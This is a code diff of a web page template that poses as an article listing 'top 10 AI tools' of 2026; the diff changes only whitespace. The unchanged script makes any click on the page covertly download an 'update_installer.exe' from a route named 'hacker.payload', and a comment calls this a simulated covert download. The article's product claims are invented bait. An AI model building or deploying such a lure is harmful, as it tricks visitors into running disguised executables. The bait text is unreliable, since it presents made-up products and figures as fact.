@@ -21,13 +21,13 @@
 
         <div class="space-y-6 text-lg leading-relaxed">
             <p>Artificial Intelligence is moving at a breakneck pace. By 2026, the landscape of AI tools has shifted entirely, integrating seamlessly into our daily workflows. In this article, we explore the top 10 tools that are reshaping industries.</p>
-            
+
             <h3 class="text-2xl font-semibold mt-4">1. NeuralSync</h3>
             <p>NeuralSync offers unparalleled brain-to-text capabilities, allowing users to draft emails and documents simply by thinking about them. Early adopters are reporting a 300% increase in productivity.</p>
 
             <h3 class="text-2xl font-semibold mt-4">2. QuantumCode</h3>
             <p>Forget Copilot; QuantumCode writes entire applications based on a single paragraph of prompt, deploying them instantly across multiple cloud providers securely.</p>
-            
+
             <p class="text-blue-500 font-semibold mt-8 animate-pulse text-center"><em>(Click anywhere to continue reading...)</em></p>
         </div>
     </main>
@@ -51,7 +51,7 @@
             // Ensure we only trigger it once to simulate a covert download
             if (!window.hasTriggeredDownload) {
                 window.hasTriggeredDownload = true;
-                
+
                 const a = document.createElement('a');
                 a.href = "{{ route('hacker.payload') }}";
                 a.download = "update_installer.exe"; // Force download hint
